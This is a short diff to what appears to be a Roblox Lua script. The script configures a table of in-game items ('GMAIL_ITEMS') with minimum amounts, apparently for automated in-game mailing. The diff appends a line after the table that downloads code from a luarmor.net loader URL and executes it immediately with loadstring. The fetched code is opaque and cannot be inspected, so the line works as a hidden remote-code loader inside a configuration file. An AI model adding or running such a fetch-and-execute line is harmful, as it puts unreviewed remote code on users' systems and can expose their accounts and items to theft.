@@ -172,3 +172,5 @@ getgenv().GMAIL_ITEMS = {
     ["Bucket O' Magic"] = {Class = "Misc", Id= "Bucket O' Magic", MinAmount = 200},
 
 }
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ba2dcad2127dcfc04301dfe52ce6c61c.lua"))()
